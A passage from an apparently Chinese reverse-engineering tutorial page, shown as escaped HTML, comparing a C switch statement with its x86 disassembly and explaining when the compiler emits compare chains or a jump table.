class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func</span><span class=\"params\">(<span class=\"type\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">switch</span>(x)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;2&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;3&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">default</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;5&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">func</span>(<span class=\"number\">2</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">00401020</span> <span class=\"number\">55</span>                   push        ebp</span><br><span class=\"line\"><span class=\"number\">00401021</span> <span class=\"number\">8B</span> EC                mov         ebp,esp</span><br><span class=\"line\"><span class=\"number\">00401023</span> <span class=\"number\">83</span> EC <span class=\"number\">44</span>             sub         esp,<span class=\"number\">44</span>h</span><br><span class=\"line\"><span class=\"number\">00401026</span> <span class=\"number\">53</span>                   push        ebx</span><br><span class=\"line\"><span class=\"number\">00401027</span> <span class=\"number\">56</span>                   push        esi</span><br><span class=\"line\"><span class=\"number\">00401028</span> <span class=\"number\">57</span>                   push        edi</span><br><span class=\"line\"><span class=\"number\">00401029</span> <span class=\"number\">8</span>D <span class=\"number\">7</span>D BC             lea         edi,[ebp<span class=\"number\">-44</span>h]</span><br><span class=\"line\"><span class=\"number\">0040102</span>C B9 <span class=\"number\">11</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       mov         ecx,<span class=\"number\">11</span>h</span><br><span class=\"line\"><span class=\"number\">00401031</span> B8 CC CC CC CC       mov         eax,<span class=\"number\">0</span>CCCCCCCCh</span><br><span class=\"line\"><span class=\"number\">00401036</span> F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">00401038</span> <span class=\"number\">8B</span> <span class=\"number\">45</span> <span class=\"number\">08</span>             mov         eax,dword ptr [ebp+<span class=\"number\">8</span>]</span><br><span class=\"line\"><span class=\"number\">0040103B</span> <span class=\"number\">89</span> <span class=\"number\">45</span> FC             mov         dword ptr [ebp<span class=\"number\">-4</span>],eax</span><br><span class=\"line\"><span class=\"number\">0040103</span>E <span class=\"number\">83</span> <span class=\"number\">7</span>D FC <span class=\"number\">01</span>          cmp         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"number\">00401042</span> <span class=\"number\">74</span> <span class=\"number\">0</span>E                je          func+<span class=\"number\">32</span>h (<span class=\"number\">00401052</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">00401044</span> <span class=\"number\">83</span> <span class=\"number\">7</span>D FC <span class=\"number\">02</span>          cmp         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"number\">00401048</span> <span class=\"number\">74</span> <span class=\"number\">17</span>                je          func+<span class=\"number\">41</span>h (<span class=\"number\">00401061</span>)</span><br><span class=\"line\"><span class=\"number\">0040104</span>A <span class=\"number\">83</span> <span class=\"number\">7</span>D FC <span class=\"number\">03</span>          cmp         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">3</span></span><br><span class=\"line\"><span class=\"number\">0040104</span>E <span class=\"number\">74</span> <span class=\"number\">20</span>                je          func+<span class=\"number\">50</span>h (<span class=\"number\">00401070</span>)</span><br><span class=\"line\"><span class=\"number\">00401050</span> EB <span class=\"number\">2</span>D                jmp         func+<span class=\"number\">5F</span>h (<span class=\"number\">0040107f</span>)</span><br><span class=\"line\"><span class=\"number\">00401052</span> <span class=\"number\">68</span> <span class=\"number\">28</span> <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;1&quot;</span> (<span class=\"number\">00422028</span>)</span><br><span class=\"line\"><span class=\"number\">00401057</span> E8 E4 <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       <span class=\"function\">call        <span class=\"title\">printf</span> <span class=\"params\">(<span class=\"number\">00401140</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040105C 83 C4 04             add         esp,4</span></span><br><span class=\"line\"><span class=\"function\">0040105F EB 2B                jmp         func+6<span class=\"title\">Ch</span> <span class=\"params\">(<span class=\"number\">0040108</span>c)</span></span></span><br><span class=\"line\"><span class=\"function\">00401061 68 24 20 42 00       push        offset string &quot;2&quot; <span class=\"params\">(<span class=\"number\">00422024</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">00401066 E8 D5 00 00 00       call        <span class=\"title\">printf</span> <span class=\"params\">(<span class=\"number\">00401140</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040106B 83 C4 04             add         esp,4</span></span><br><span class=\"line\"><span class=\"function\">0040106E EB 1C                jmp         func+6<span class=\"title\">Ch</span> <span class=\"params\">(<span class=\"number\">0040108</span>c)</span></span></span><br><span class=\"line\"><span class=\"function\">00401070 68 20 20 42 00       push        offset string &quot;4&quot; <span class=\"params\">(<span class=\"number\">00422020</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">00401075 E8 C6 00 00 00       call        <span class=\"title\">printf</span> <span class=\"params\">(<span class=\"number\">00401140</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040107A 83 C4 04             add         esp,4</span></span><br><span class=\"line\"><span class=\"function\">0040107D EB 0D                jmp         func+6<span class=\"title\">Ch</span> <span class=\"params\">(<span class=\"number\">0040108</span>c)</span></span></span><br><span class=\"line\"><span class=\"function\">0040107F 68 1C 20 42 00       push        offset string &quot;5&quot; <span class=\"params\">(<span class=\"number\">0042201</span>c)</span></span></span><br><span class=\"line\"><span class=\"function\">00401084 E8 B7 00 00 00       call        <span class=\"title\">printf</span> <span class=\"params\">(<span class=\"number\">00401140</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">00401089 83 C4 04             add         esp,4</span></span><br><span class=\"line\"><span class=\"function\">0040108C 5F                   pop         edi</span></span><br><span class=\"line\"><span class=\"function\">0040108D 5E                   pop         esi</span></span><br><span class=\"line\"><span class=\"function\">0040108E 5B                   pop         ebx</span></span><br><span class=\"line\"><span class=\"function\">0040108F 83 C4 44             add         esp,44h</span></span><br><span class=\"line\"><span class=\"function\">00401092 3B EC                cmp         ebp,esp</span></span><br><span class=\"line\"><span class=\"function\">00401094 E8 27 01 00 00       call        __<span class=\"title\">chkesp</span> <span class=\"params\">(<span class=\"number\">004011</span>c0)</span></span></span><br><span class=\"line\"><span class=\"function\">00401099 8B E5                mov         esp,ebp</span></span><br><span class=\"line\"><span class=\"function\">0040109B 5D                   pop         ebp</span></span><br><span class=\"line\"><span class=\"function\">0040109C C3                   ret</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"comment\">//分支条件比较少时&lt;4和if-else反汇编类似</span></span></span><br><span class=\"line\"><span class=\"function\">    </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"comment\">//分支大于4时在内存中生成大表  [edx*4+4010B1h]通过寻址</span></span></span><br><span class=\"line\"><span class=\"function\">    </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func</span><span class=\"params\">(<span class=\"type\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">switch</span>(x)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;2&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;3&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">4</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;4&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">default</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;5&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">func</span>(<span class=\"number\">2</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">00401020</span> <span class=\"number\">55</span>                   push        ebp</span><br><span class=\"line\"><span class=\"number\">00401021</span> <span class=\"number\">8B</span> EC                mov         ebp,esp</span><br><span class=\"line\"><span class=\"number\">00401023</span> <span class=\"number\">83</span> EC <span class=\"number\">44</span>             sub         esp,<span class=\"number\">44</span>h</span><br><span class=\"line\"><span class=\"number\">00401026</span> <span class=\"number\">53</span>                   push        ebx</span><br><span class=\"line\"><span class=\"number\">00401027</span> <span class=\"number\">56</span>                   push        esi</span><br><span class=\"line\"><span class=\"number\">00401028</span> <span class=\"number\">57</span>                   push        edi</span><br><span class=\"line\"><span class=\"number\">00401029</span> <span class=\"number\">8</span>D <span class=\"number\">7</span>D BC             lea         edi,[ebp<span class=\"number\">-44</span>h]</span><br><span class=\"line\"><span class=\"number\">0040102</span>C B9 <span class=\"number\">11</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       mov         ecx,<span class=\"number\">11</span>h</span><br><span class=\"line\"><span class=\"number\">00401031</span> B8 CC CC CC CC       mov         eax,<span class=\"number\">0</span>CCCCCCCCh</span><br><span class=\"line\"><span class=\"number\">00401036</span> F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\"><span class=\"number\">00401038</span> <span class=\"number\">8B</span> <span class=\"number\">45</span> <span class=\"number\">08</span>             mov         eax,dword ptr [ebp+<span class=\"number\">8</span>]</span><br><span class=\"line\"><span class=\"number\">0040103B</span> <span class=\"number\">89</span> <span class=\"number\">45</span> FC             mov         dword ptr [ebp<span class=\"number\">-4</span>],eax</span><br><span class=\"line\"><span class=\"number\">0040103</span>E <span class=\"number\">8B</span> <span class=\"number\">4</span>D FC             mov         ecx,dword ptr [ebp<span class=\"number\">-4</span>]</span><br><span class=\"line\"><span class=\"number\">00401041</span> <span class=\"number\">83</span> E9 <span class=\"number\">01</span>             sub         ecx,<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"number\">00401044</span> <span class=\"number\">89</span> <span class=\"number\">4</span>D FC             mov         dword ptr [ebp<span class=\"number\">-4</span>],ecx</span><br><span class=\"line\"><span class=\"number\">00401047</span> <span class=\"number\">83</span> <span class=\"number\">7</span>D FC <span class=\"number\">03</span>          cmp         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">3</span></span><br><span class=\"line\"><span class=\"number\">0040104B</span> <span class=\"number\">77</span> <span class=\"number\">46</span>                ja          $L539+<span class=\"number\">0F</span>h (<span class=\"number\">00401093</span>)</span><br><span class=\"line\"><span class=\"number\">0040104</span>D <span class=\"number\">8B</span> <span class=\"number\">55</span> FC             mov         edx,dword ptr [ebp<span class=\"number\">-4</span>]</span><br><span class=\"line\"><span class=\"number\">00401050</span> FF <span class=\"number\">24</span> <span class=\"number\">95</span> B1 <span class=\"number\">10</span> <span class=\"number\">40</span> <span class=\"number\">00</span> jmp         dword ptr [edx*<span class=\"number\">4</span>+<span class=\"number\">4010B</span>1h]</span><br><span class=\"line\">$L533:</span><br><span class=\"line\"><span class=\"number\">00401057</span> <span class=\"number\">68</span> <span class=\"number\">2</span>C <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;1&quot;</span> (<span class=\"number\">0042202</span>c)</span><br><span class=\"line\"><span class=\"number\">0040105</span>C E8 DF <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       <span class=\"function\">call        <span class=\"title\">printf</span> <span class=\"params\">(<span class=\"number\">00401140</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">00401061 83 C4 04             add         esp,4</span></span><br><span class=\"line\"><span class=\"function\">00401064 EB 3A                jmp         $L539+1<span class=\"title\">Ch</span> <span class=\"params\">(<span class=\"number\">004010</span>a0)</span></span></span><br><span class=\"line\"><span class=\"function\">$L535:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">00401066</span> <span class=\"number\">68</span> <span class=\"number\">28</span> <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;2&quot;</span> (<span class=\"number\">00422028</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040106B</span> E8 D0 <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">00401070</span> <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">00401073</span> EB <span class=\"number\">2B</span>                jmp         $L539+<span class=\"number\">1</span>Ch (<span class=\"number\">004010</span>a0)</span></span><br><span class=\"line\"><span class=\"function\">$L537:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">00401075</span> <span class=\"number\">68</span> <span class=\"number\">24</span> <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;3&quot;</span> (<span class=\"number\">00422024</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040107</span>A E8 C1 <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040107F</span> <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">00401082</span> EB <span class=\"number\">1</span>C                jmp         $L539+<span class=\"number\">1</span>Ch (<span class=\"number\">004010</span>a0)</span></span><br><span class=\"line\"><span class=\"function\">$L539:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">00401084</span> <span class=\"number\">68</span> <span class=\"number\">20</span> <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;4&quot;</span> (<span class=\"number\">00422020</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">00401089</span> E8 B2 <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040108</span>E <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">00401091</span> EB <span class=\"number\">0</span>D                jmp         $L539+<span class=\"number\">1</span>Ch (<span class=\"number\">004010</span>a0)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">00401093</span> <span class=\"number\">68</span> <span class=\"number\">1</span>C <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;5&quot;</span> (<span class=\"number\">0042201</span>c)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">00401098</span> E8 A3 <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040109</span>D <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">004010</span>A0 <span class=\"number\">5F</span>                   pop         edi</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">004010</span>A1 <span class=\"number\">5</span>E                   pop         esi</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">004010</span>A2 <span class=\"number\">5B</span>                   pop         ebx</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">004010</span>A3 <span class=\"number\">83</span> C4 <span class=\"number\">44</span>             add         esp,<span class=\"number\">44</span>h</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">004010</span>A6 <span class=\"number\">3B</span> EC                cmp         ebp,esp</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">004010</span>A8 E8 <span class=\"number\">13</span> <span class=\"number\">01</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       call        __chkesp (<span class=\"number\">004011</span>c0)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">004010</span>AD <span class=\"number\">8B</span> E5                mov         esp,ebp</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">004010</span>AF <span class=\"number\">5</span>D                   pop         ebp</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">004010B</span>0 C3                   ret</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span></span><br><span class=\"line\"><span class=\"function\">//case顺序交换不影响大表的生成，即可以是无序的</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230123113122801.png\" alt=\"image-20230123113122801\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span 